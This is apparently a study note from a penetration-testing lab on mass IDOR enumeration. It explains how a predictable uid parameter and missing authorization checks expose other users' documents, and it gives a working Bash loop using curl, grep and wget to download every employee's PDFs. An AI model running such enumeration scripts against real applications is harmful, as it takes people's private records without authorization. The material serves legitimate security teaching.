![Image](https://images.openai.com/static-rsc-4/XmupKmPtwxGWl8unxG5BJHCD9u0cG0MhCfAcqGJkSw_1cMYNmnt5hekh8JQHmeyDKG0Xt5mADFg5RJmmnuISaPo95wq4FDBi10S3JZ8mqnjEm8EQBf0VJ5m2r2SU5x--Br8wFwTnlZI779sbLRJ26CwgLU5sy1_KE_ePiACKQC7fZ5nqa4yygNyYHM-FfSKB?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/-cdxhwYt_aJ1ITGjCNkgfOOnQ4oNMApOkWNXFKx4Cv-OpcUv7ac8VZeLsMuBsxmEyFx7r-z6B_PiLsn4hajtRGtn2c59L8WHwf360yBScThvi7ThfQ9wcvGGw0mhGDFlXuU1OXdVM5ASk7F3m9U9URBWP8uKTb-if0pSmfL0m9Kj9c2JBjIDUjKzoLBDU7JN?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/rImC4DD1lpVx1TL-cAk74bVEYtXuhWSWjK58WnlwFa3B13a2F54NY9n7VZvYX-qs2ZrgkGVL43B3f_oh8bvdbZ6UzhQNouXXHEts0ZX50l1uxmRw9orr3VaSbFbLp5X16ko0HTXcQyV64IbOc9BsRHrzNWgwIbMyXeVIgwadJNxHP_2kXT9Ujodve6-iNx_R?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/Aa122HxmfmRpLmdBBQRt5TiQ9PkLxUUvr2voIKdH6Sr_YCVTxBYdhl3ozQh4e1Od0e84FdhlklPxfi5OZW6VmcXrD-WO0c7hVq_u3N-gkiT8TqxRXvWxryX9bexdR-nDcz2lDtBLjB4-WX4SLFIFaow6SaOgsYfPRoXfri1cGproXBg3bn4SriOd1YN0LBVZ?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/e_KpyYe2lIXG94m-B6O-3NmcfJxx3vA7pU8wi1ZsFZbtuFSFvP2f2fTQEsLkvJaq96QPbOih0oUK4oBEXY6zJh8_pxX7KWYDiC2wdFtxqVZeok3vp63vuxUkpaz1CLwd3LvasF2sa65c4s5MutmXcuF3EIXWvB42juLpmSzEsUHCblNEoBF_M8XnzoxhQKT0?purpose=fullsize)

## 1. What is Mass IDOR Enumeration?

Once an IDOR vulnerability has been identified, the next step is determining **how much data can be accessed**.

A basic IDOR might allow:

```text
uid=1  → User 1's document
uid=2  → User 2's document
```

If the identifier is predictable, we may potentially test many values:

```text
uid=1
uid=2
uid=3
uid=4
...
uid=N
```

This is known as **IDOR enumeration**.

When this is automated across many users/resources, it becomes **mass IDOR enumeration**.

### Key idea

> **Instead of manually accessing one unauthorized object, automate the process of testing many object references.**

---

# 2. Basic IDOR vs Advanced IDOR

IDOR exploitation can range from simple to highly complex.

### Basic IDOR

Usually involves:

```text
Find parameter
      ↓
Change value
      ↓
Access another object
```

Example:

```text
?id=1
```

becomes:

```text
?id=2
```

### Advanced IDOR

May require understanding:

- How object references are generated
    
- How IDs are calculated
    
- How the backend handles authorization
    
- Relationships between users and objects
    
- Encoded/hashed references
    
- Different user roles
    
- API behavior
    

The more complex the application, the more important it becomes to understand its underlying logic.

---

# 3. Insecure Parameters

The module's first example uses an **Employee Manager** web application.

Suppose we are authenticated as:

```text
uid=1
```

The application contains:

```text
Personal Records
Documents
Contracts
```

When we click **Documents**, we are taken to:

```text
/documents.php?uid=1
```

The important part is:

```text
uid=1
```

This is a **Direct Object Reference**.

The application is effectively saying:

> "Show me the documents associated with employee 1."

---

# 4. Static File IDOR

The documents themselves have names such as:

```text
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```

Notice the naming pattern:

```text
Invoice_<UID>_<MONTH>_<YEAR>.pdf
Report_<UID>_<MONTH>_<YEAR>.pdf
```

For example:

```text
Invoice_1_09_2021.pdf
       ↑
      UID
```

This creates another possible source of object references.

Because the filename contains the employee's UID, we might discover files associated with other users.

This is referred to in the module as:

> **Static File IDOR**

---

# 5. Why Static File IDOR Isn't Always Enough

Suppose we know:

```text
Invoice_1_09_2021.pdf
Report_1_10_2021.pdf
```

We might try:

```text
Invoice_2_09_2021.pdf
Report_2_10_2021.pdf
```

But there is a problem.

We don't necessarily know:

- Which months have documents
    
- Which document types exist
    
- Exact filenames
    
- How many documents each employee has
    

Therefore, filename guessing may reveal some resources but not necessarily everything.

A more interesting reference is:

```text
documents.php?uid=1
```

because it controls **which employee's documents the application displays**.

---

# 6. Testing the `uid` Parameter

Original request:

```text
/documents.php?uid=1
```

We can test another value:

```text
/documents.php?uid=2
```

A secure application should perform a backend authorization check:

```text
User 1
  ↓
Requests uid=2
  ↓
Backend authorization
  ↓
Access denied ❌
```

If the backend does not perform this check:

```text
User 1
  ↓
Requests uid=2
  ↓
Backend retrieves User 2's documents
  ↓
Access granted ❌
```

That is the core of the IDOR vulnerability.

---

# 7. A Subtle but Important Observation

In the exercise, changing:

```text
uid=1
```

to:

```text
uid=2
```

doesn't immediately make the page look dramatically different.

This is an important penetration-testing lesson.

> **Don't rely only on obvious visual changes.**

You should inspect:

- Links
    
- HTML source
    
- Response size
    
- Response content
    
- API responses
    
- Filenames
    
- Metadata
    
- Page source
    

The application may look almost identical while actually returning completely different data.

---

# 8. Comparing the Documents

With:

```text
uid=1
```

we might see:

```text
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```

After changing to:

```text
uid=2
```

we may see:

```text
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf
```

The difference confirms that:

```text
uid
 ↓
Controls which employee's documents are returned
```

If User 1 can access User 2's documents, this demonstrates **broken object-level authorization / IDOR**.

---

# 9. Important Pentesting Principle

The module emphasizes:

> **We must be attentive to the page details during any web pentest.**

Don't just look at the page visually.

For example:

```text
Page looks identical
        ↓
Inspect HTML
        ↓
Different filenames
        ↓
Different user data
        ↓
Potential IDOR
```

This is especially important when testing APIs and applications that dynamically generate content.

---

# 10. Filter Parameters Can Also Cause IDOR

It's not always:

```text
uid=1
```

It could be something like:

```text
uid_filter=1
```

For example:

```text
/documents.php?uid_filter=1
```

If this parameter determines which user's documents are displayed, manipulating it could potentially expose other users' documents.

An even more serious design issue could occur if removing the filter:

```text
uid_filter=1
```

entirely causes the application to return:

```text
ALL documents
```

### Important concept

> **Any client-controlled parameter that influences which objects are returned deserves authorization testing.**

---

# 11. Mass Enumeration

Manually testing:

```text
uid=1
uid=2
uid=3
uid=4
...
```

is inefficient.

Imagine an organization with:

```text
10 employees → manageable
100 employees → annoying
1,000 employees → impractical
10,000 employees → definitely automate
```

Therefore, authorized security testing can use automation.

Common approaches include:

- **Burp Suite Intruder**
    
- **ZAP Fuzzer**
    
- Bash scripts
    
- PowerShell scripts
    
- Other authorized automation tools
    

---

# 12. Inspecting the HTML

The module uses Firefox's element inspector.

The HTML contains:

```html
<li class='pure-tree_link'>
    <a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>
        Invoice
    </a>
</li>

<li class='pure-tree_link'>
    <a href='/documents/Report_3_01_2020.pdf' target='_blank'>
        Report
    </a>
</li>
```

The important part is:

```text
href='/documents/Invoice_3_06_2020.pdf'
```

and:

```text
href='/documents/Report_3_01_2020.pdf'
```

These are the actual document URLs.

---

# 13. Extracting Links with `curl`

Instead of manually inspecting the page, we can retrieve it from the command line.

For example:

```bash
curl -s "http://SERVER_IP:PORT/documents.php?uid=3"
```

The `-s` option makes `curl` operate silently.

We can pipe the output into:

```bash
grep "<li class='pure-tree_link'>"
```

Full command:

```bash
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"
```

The result contains:

```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

---

# 14. Why `grep` Is Useful

We don't necessarily want the entire webpage.

We only want the document URLs.

So we can use a regular expression to extract them.

The module uses:

```bash
grep -oP "\/documents.*?.pdf"
```

Full command:

```bash
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
```

Output:

```text
/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf
```

---

# 15. Understanding `grep -oP`

Two useful options here:

### `-o`

Print only the portion matching the pattern.

Instead of printing:

```html
<li class='pure-tree_link'>...</li>
```

it prints only:

```text
/documents/Invoice_3_06_2020.pdf
```

### `-P`

Enables Perl-compatible regular expressions.

The pattern:

```text
\/documents.*?.pdf
```

essentially searches for content beginning with:

```text
/documents
```

and continuing through:

```text
.pdf
```

---

# 16. Automating the Enumeration

The module then uses a Bash loop.

Conceptually:

```text
UID 1
 ↓
Get document page
 ↓
Extract links
 ↓
Download documents

UID 2
 ↓
Get document page
 ↓
Extract links
 ↓
Download documents

UID 3
 ↓
...
```

The provided lab script is:

```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

---

# 17. Breaking Down the Script

### Step 1 — Define the target

```bash
url="http://SERVER_IP:PORT"
```

Stores the application's base URL.

---

### Step 2 — Loop through UIDs

```bash
for i in {1..10}; do
```

This tests:

```text
1
2
3
...
10
```

So the script is testing ten employee IDs.

---

### Step 3 — Request each user's document page

```bash
curl -s "$url/documents.php?uid=$i"
```

For each value of `i`, the request becomes:

```text
uid=1
uid=2
uid=3
...
uid=10
```

---

### Step 4 — Extract document URLs

```bash
grep -oP "\/documents.*?.pdf"
```

Only matching document paths are returned.

Example:

```text
/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf
```

---

### Step 5 — Download each document

```bash
wget -q $url/$link
```

`wget` retrieves each document.

The `-q` option makes the download quiet.

---

# 18. Nested Loops

The script contains two loops:

```text
Outer loop
    ↓
UID 1 → UID 10
    ↓
Inner loop
    ↓
Every document belonging to that UID
```

Visualized:

```text
UID 1
 ├── Invoice
 └── Report

UID 2
 ├── Invoice
 └── Report

UID 3
 ├── Invoice
 └── Report

...
UID 10
 ├── Invoice
 └── Report
```

This allows the tester to retrieve multiple resources automatically.

---

# 19. What Makes This a Mass IDOR?

The vulnerability itself is:

```text
User controls UID
       +
Backend fails authorization
       ↓
Access another user's resources
```

Mass enumeration adds:

```text
Predictable UID
       +
Automation
       ↓
Many unauthorized resources
```

So:

> **IDOR + predictable references + automation = potentially large-scale data exposure.**

---

# 20. Impact

Mass IDOR enumeration can turn a single authorization flaw into a large data breach.

Potentially exposed information could include:

- Employee documents
    
- Invoices
    
- Reports
    
- Personal records
    
- Contracts
    
- Account information
    
- Private files
    
- Other sensitive business data
    

The severity depends heavily on **what the exposed objects contain** and how many users/resources are affected.

---

# 21. Important: Predictability Is Not the Root Cause

Suppose:

```text
uid=1
uid=2
uid=3
```

is predictable.

That makes enumeration easier.

But the real vulnerability is:

```text
User 1
   ↓
Requests uid=2
   ↓
Backend doesn't verify authorization
   ↓
User 2's data returned
```

Therefore:

### ❌ Not sufficient

```text
Predictable ID
```

### ✅ Actual problem

```text
Predictable/controlled ID
+
Missing backend authorization
```

---

# 22. Tools Mentioned

## Burp Suite Intruder

Can automate requests containing changing parameters.

Conceptually:

```text
uid=1
uid=2
uid=3
...
```

Useful for testing predictable object references in authorized environments.

---

## OWASP ZAP Fuzzer

Another option for automating parameter variations.

Useful for:

- IDs
    
- filenames
    
- parameters
    
- API values
    

---

## Bash

Can automate requests and process responses using tools such as:

```text
curl
grep
wget
```

---

## PowerShell

The same general process can be automated in Windows environments.

---

# 23. Static File IDOR vs Parameter IDOR

|Type|Example|Main Technique|
|---|---|---|
|Static File IDOR|`/documents/Invoice_2_08_2020.pdf`|Discover/guess filenames|
|Parameter IDOR|`documents.php?uid=2`|Manipulate object parameter|
|API IDOR|`/api/users/2/documents`|Manipulate API object reference|
|Mass IDOR|`uid=1...N`|Automate enumeration|

---

# 24. Important Testing Workflow

```text
                 Find Resource
                      │
                      ▼
              Inspect HTTP Request
                      │
                      ▼
             Find Object Reference
                      │
                      ▼
             Example: uid=1
                      │
                      ▼
             Change Reference
                      │
                      ▼
             Example: uid=2
                      │
                      ▼
           Check Response Carefully
                      │
             ┌────────┴────────┐
             ▼                 ▼
      Same user's data    Different user's data
             │                 │
             ▼                 ▼
        Probably safe       Potential IDOR
                               │
                               ▼
                       Determine ID pattern
                               │
                               ▼
                          Automate testing
                               │
                               ▼
                       Measure the impact
```

---

# 🧠 25. High-Value Lessons

### ⭐ 1. Inspect parameters

Always look for parameters such as:

```text
uid
user_id
id
file_id
document_id
account_id
```

---

### ⭐ 2. Don't trust the UI

A page can appear identical while the underlying resources have changed.

Always inspect:

```text
HTML
URLs
HTTP responses
API responses
file names
response size
```

---

### ⭐ 3. Look for predictable patterns

Examples:

```text
1 → 2 → 3
user1 → user2
file_1 → file_2
```

Predictability makes enumeration easier.

---

### ⭐ 4. Check filters

Look for:

```text
uid_filter=1
user_id=1
account=1
```

Client-controlled filters can sometimes expose objects belonging to other users.

---

### ⭐ 5. Automate only after confirming the vulnerability

Don't immediately launch thousands of requests.

A sensible workflow is:

```text
Manual test
    ↓
Confirm authorization issue
    ↓
Understand object pattern
    ↓
Determine safe scope
    ↓
Automate
```

---

# 🔥 26. Mass IDOR — Quick Revision

```text
IDOR
│
├── Direct Object Reference
│      ├── uid
│      ├── file_id
│      ├── document_id
│      └── API object ID
│
├── Test
│      ├── Change reference
│      ├── Compare responses
│      └── Verify authorization
│
├── Predictable References
│      ├── Sequential IDs
│      ├── Static filenames
│      └── User-based naming
│
└── Mass Enumeration
       ├── Burp Intruder
       ├── ZAP Fuzzer
       ├── Bash
       └── PowerShell
```

## 🎯 Golden Takeaway

> **Mass IDOR Enumeration is the process of automating the discovery and retrieval of multiple objects after identifying an IDOR vulnerability.**

The core chain to remember is:

**`Client-controlled object reference → Missing backend authorization → Unauthorized object access → Predictable reference → Automated enumeration → Large-scale data exposure.`**

And the most important distinction:

> **The predictable `uid` is what makes mass enumeration practical; the missing backend authorization is what makes it vulnerable.**

